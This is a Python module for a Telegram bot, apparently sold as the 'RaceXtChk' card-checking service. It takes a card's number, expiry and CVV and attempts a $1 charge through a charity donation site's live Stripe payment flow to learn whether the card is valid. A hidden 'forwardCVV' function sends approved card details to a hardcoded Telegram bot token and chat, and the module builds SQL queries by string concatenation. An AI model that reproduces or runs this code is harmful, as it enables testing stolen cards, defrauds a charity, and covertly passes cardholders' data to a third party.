import json
import requests
import time
import asyncio
import re
import os
import colored 
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from db import *
from user import*
from values import *

# Establece los detalles de la conexión


# Establece los detalles de la conexión
def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)

@Client.on_message(filters.command(["bg"], ["/", "."]))
async def ch(_, message: Message):

            username = message.from_user.username
            chat_id = message.chat.id
            user_id = (
        message.from_user.id
    )

            
# Obtener información del grupo
            queryGroups = "SELECT * FROM `groups` WHERE id=" + str(chat_id)
            cursorGroups = db.cursor()
            cursorGroups.execute(queryGroups)
            resultGroups = cursorGroups.fetchall()

# Obtener información del usuario
            queryUsers = "SELECT * FROM users WHERE user_id='" + str(user_id) + "'"
            cursorUsers = db.cursor()
            cursorUsers.execute(queryUsers)
            resultUsers = cursorUsers.fetchall()

            isPremium = False

# Verificar si el usuario es premium en la tabla "users" solo si no es premium en la tabla "groups"
            

            row = None  # Asignar un valor por defecto

            if not isPremium and len(resultUsers) > 0:
                row = resultUsers[0]
            if row and row[2] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True
            
            # ...
            
            if len(resultGroups) > 0:
                row = resultGroups[0]
            if row and row[3] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True

            

# Verificar si el bot se está utilizando en un grupo
            isGroupChat = message.chat.type == 'group'

            if not isPremium:
             message_text = "Para usar el bot"
    
             if isGroupChat:
              message_text += " en este grupo, debes comprar RaceXtChk. Por favor, ponte en contacto con los vendedores para obtener más información."
             else:
              message_text += ", debes comprar RaceXtChk. Por favor, ponte en contacto con los vendedores para obtener más información."
    
             await message.reply_text(f"<i>{message_text}</i>")
             return
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
<i>Comando</i> <i>/auth</i>
<i>Formato:</i> <code>cc|mm|yy|cvv</code>
<i>Gateway:</i> <code>Auth</code>""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return
   #dabese variable
            
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           

    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text( "No estás registrado. Por favor, utiliza /register para registrarte.")
             return  
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            rank = result[0]
            if message.from_user.id in antispam_users and antispam_users[message.from_user.id] + 16 > int(time.time()):
             time_left = antispam_users[message.from_user.id] + 16 - int(time.time())
             await message.reply_text(f"❗️ [<i>ANTISPAM DETECTADO</i>]. Espera {time_left} segundos antes de enviar otro comando.")
             return 
            else:
             antispam_users[message.from_user.id] = int(time.time())

    # ... (el resto del código existente)
    # ... (el resto del código existente)

                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
                    
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            msg=await message.reply(f"""<b>⎚Gateway| Bogota
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")

            headers = {
                'authority': 'api.stripe.com',
                'accept': '*/*',
                'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://www.migranodearena.org',
                'referer': 'https://www.migranodearena.org/reto/estudio-pionero-de-investigacion-del-sindrome-ddx3x/dona/pagoseleccionado',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            }

            data = f'amount=100&donation=c50ae784-96ac-4a20-ba2c-3efd1ccc6814'
            res = requests.post('https://www.migranodearena.org/paymentIntent', headers=headers, data=data)
            if "client_secret" in res.text:
              secret = res.json()["client_secret"]
              id  = secret.split("_")[1]
                
              print(res.text)  
               
            #idw= res['id']
           

            #await message.reply(idw)
              msg1=await msg.edit(f"""<b>⎚Gateway | Bogota
Card: <code>{ccs}</code>
Progress 🟠 4.40(s)</b>""")

              cookies = {
                    'PHPSESSID': '7f33de07952840af847a87ae09b81d0e',
                }

              headers = {
                    'Accept': 'application/json',
                    'Accept-Language': 'es-ES,es;q=0.9',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://js.stripe.com',
                    'Referer': 'https://js.stripe.com/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                    
                }

              data = f'payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=d3ed12ec-8e21-4cd2-bbf4-868b97dbc7d308b451&payment_method_data[muid]=cf2bb027-76c5-4b1a-b5fc-36e4e834347abedad6&payment_method_data[sid]=d0e8684a-b1d7-455e-bcd0-4476e7001a22c5a8c2&payment_method_data[payment_user_agent]=stripe.js%2F5fafadf87b%3B+stripe-js-v3%2F5fafadf87b%3B+card-element&payment_method_data[time_on_page]=28786&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_uqb3RlBO3MrsMHmas3veX2pY00nQMr71Ay&client_secret={secret}'

              response1 = requests.post(f'https://api.stripe.com/v1/payment_intents/pi_'+id+'/confirm',headers=headers,data=data)
              
              print(response1.text)
              
                

              msg2=await msg1.edit(f"""<b>⎚Gateway | Bogota
Card: <code>{ccs}</code>
Progress 🟢 6.20(s)</b>""")


              
              def forwardCVV(text):
                requests.get("https://api.telegram.org/bot6133153598:AAE_jJWR1oaMasP2vmaDzCTy36zz_5QI2nw/sendMessage?chat_id=1924666696&text=" + text)
              if 'succeeded' in response1.text:
                status = "Approved✅"
                msg = "Charged 1$"
                save_live(ccs)
                forwardCVV(f"""⊗GATEWAY- Bogota\n⊗Card:{ccs}\n⊗ Status:Approved✅\n⊗ Response:Charged 1$\n⌧ Checked by:{message.from_user.first_name}""")
              elif 'insufficient_funds' in response1.text:
                status = "Approved✅"
                msg = "insufficient funds"
                forwardCVV(f"""⊗GATEWAY- Bogota\n⊗Card:{ccs}\n⊗ Status:Approved✅\n⊗ Response:Fondos Insuficients\n⌧ Checked by:{message.from_user.first_name}""")
              elif 'incorrect_cvc' in response1.text:
                status = "Approved CCN✅"
                msg = "incorrect cvc"
              elif 'transaction_not_allowed' in response1.text:
                status = "Decined❌"
                msg = "transaction not allowed"
              elif 'do_not_honor' in response1.text:
                status = "Declined❌"
                msg = "Do Not Honor"
              elif 'stolen_card' in response1.text:
                status = "Declined❌"
                msg = "stolen card"
              elif 'lost_card' in response1.text:
                status = "Declined❌"
                msg = "lost_card"
              elif "pickup_card" in response1.text:
                status = "Declined❌"
                response = "Pickup Card"
              elif "incorrect_number" in response1.text:
                status = "Declined❌"
                msg = "Incorrect Card Number"
              elif "expired_card" in response1.text:
                status = "Declined❌"
                msg = "Expired Card"
              elif "generic_decline" in response1.text:
                status = "Declined❌"
                msg = "Generic Decline"
              elif "fraudulent" in response1.text:
                status = "Declined❌"
                msg = "Fraudulent"
              elif "lock_timeout" in response1.text:
                status = "Declined❌"
                response = "Api Error"
              elif "Your card was declined." in response1.text:
                status = "Declined❌"
                msg = "Generic Decline"
              elif "intent_confirmation_challenge" in response1.text:
                status = "Declined❌"
                msg = "Captcha"
              elif "Your card does not support this type of purchase." in response1.text:
                status = "Live 🟡"
                msg = "Locked Card"
              elif "parameter_invalid_empty" in response1.text:
                status = "Declined❌"
                msg = "404 error"
              elif "invalid_request_error" in response1.text:
                status = "Declined❌"
                msg = "404 error"
            
              else:
                status = "Declined❌"
                msg = "Gate Dead"
                
                
                
              await msg2.edit(f"""
<b> 

⊗ Card - <code>{ccs}</code> 
⊗ Status - {status}
⊗ Response - {msg}
⊗ GATEWAY- Bogota 
－－－－－－－－－－－－－－
[ BIN INFO ]
⚆ Bin - {BIN} - {brand} - {typea} - {level}
⚆ Bank - {bank} 🏛  
⚆ Country - {country} - {country_flag} 
－－－－－－－－－－－－－－
[ CHECK INFO ]
⌧ Proxy  - Live! ✅ 
⌧ Time Test - 7.4sec
⌧ Checked by: <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> ♻️
⌧ Bot by - <b><a href="tg://resolve?domain=Sarcehkr">SarceDev[Owner]</a></b>
－－－－－－－－－－－－－－</b>
            """)